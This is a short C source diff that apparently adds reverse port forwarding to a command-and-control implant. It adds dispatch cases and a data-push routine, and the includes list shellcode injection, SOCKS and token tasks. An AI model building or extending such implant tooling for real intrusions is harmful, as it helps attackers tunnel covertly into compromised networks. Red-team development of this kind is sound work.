@@ -13,6 +13,7 @@
 #include "Tasks/InlineExecute.h"
 #include "Tasks/InjectShellcode.h"
 #include "Tasks/Socks.h"
+#include "Tasks/Tunnel.h"
 #include "Tasks/Token.h"
 #include "Tasks/Link.h"
 #include "Tasks/Exit.h"
@@ -235,6 +236,20 @@ VOID TaskDispatch(_In_ BYTE cmd, _In_ char* taskUuid, _In_ PPARSER taskParser) {
             return;
         }
 #endif
+#ifdef INCLUDE_CMD_RPORTFWD
+        case RPORTFWD_CMD:
+        {
+            _dbg("RPORTFWD_CMD was called");
+            Rportfwd(taskUuid, taskParser);
+            return;
+        }
+        case RPORTFWD_RESP:
+        {
+            _dbg("RPORTFWD_RESP was called");
+            RportfwdProcessData(taskParser);
+            return;
+        }
+#endif
 #ifdef INCLUDE_CMD_LINK
         case LINK_CMD:
         {
@@ -437,6 +452,13 @@ VOID TaskRoutine()
 #if defined(INCLUDE_CMD_SOCKS)
 
     SocksPush();
+
+#endif
+
+    /* Push reverse port forward data to Server */
+#if defined(INCLUDE_CMD_RPORTFWD)
+
+    RportfwdPush();
 
 #endif
 
